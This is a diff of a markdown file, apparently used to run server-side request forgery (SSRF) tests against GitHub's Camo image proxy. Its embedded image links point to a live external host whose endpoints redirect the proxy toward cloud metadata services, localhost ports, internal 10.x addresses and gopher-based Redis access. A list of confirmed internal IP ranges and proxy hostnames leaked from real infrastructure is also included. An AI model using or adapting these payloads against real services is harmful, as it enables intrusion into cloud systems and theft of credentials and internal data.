@@ -1,25 +1,23 @@
-# Camo SSRF Testing v72 - Direct Internal Redirect Tests
+# Camo SSRF Testing v73 - Timing Based Tests
 
-## NEW: Direct SSRF Tests (bypass redirect chain limits)
+## NEW: Timing-based Internal Network Detection
 | Test | Endpoint | Purpose |
 |------|----------|--------|
-| Direct IMDS | ![](http://164.90.187.218:9999/quick169) | Single redirect to 169.254.169.254 |
-| Port scan | ![](http://164.90.187.218:9999/portscan?port=22) | Redirect to localhost:22 |
-| AWS alternate | ![](http://164.90.187.218:9999/awsalt) | instance-data.ec2.internal |
-| IPv6 IMDS | ![](http://164.90.187.218:9999/imdsv6) | fd00:ec2::254 |
-| HTTP split | ![](http://164.90.187.218:9999/httpsplit) | Request smuggling attempt |
+| Timing 10.x | ![](http://164.90.187.218:9999/timing1) | Redirect to 10.0.0.1:12345 - timing difference |
+| Timing localhost | ![](http://164.90.187.218:9999/timing2) | Redirect to 127.0.0.1:65534 |
+| Slow response | ![](http://164.90.187.218:9999/slowresp) | 30 second delay response |
 
-## Protocol Tests (from v71)
+## Previous Tests
 | Test | Endpoint | Purpose |
 |------|----------|--------|
+| Direct IMDS | ![](http://164.90.187.218:9999/quick169) | Single redirect to IMDS |
+| Port scan:22 | ![](http://164.90.187.218:9999/portscan?port=22) | SSH port redirect |
 | gopher:// | ![](http://164.90.187.218:9999/gophertest) | Redis SSRF |
-| data: URI | ![](http://164.90.187.218:9999/datauri) | data: scheme |
 | Long chain | ![](http://164.90.187.218:9999/longchain?count=0) | 10-hop redirect |
 
-## Cache Tests
-![Cache normal](http://164.90.187.218:9999/cachekey)
-![Cache admin](http://164.90.187.218:9999/cachekey?admin=true)
+## Info Disclosure Confirmed:
+- X-Forwarded-For: Internal IPs (10.48.x, 10.52.x, 10.56.x)
+- Via: github-camo build hash, squid/6.2, proxy hostnames
 
-## Previous:
+![OK](http://164.90.187.218:9999/ok)
 ![AWS](http://164.90.187.218:9999/aws)
-![SVG OOB](http://164.90.187.218:9999/svgoob)
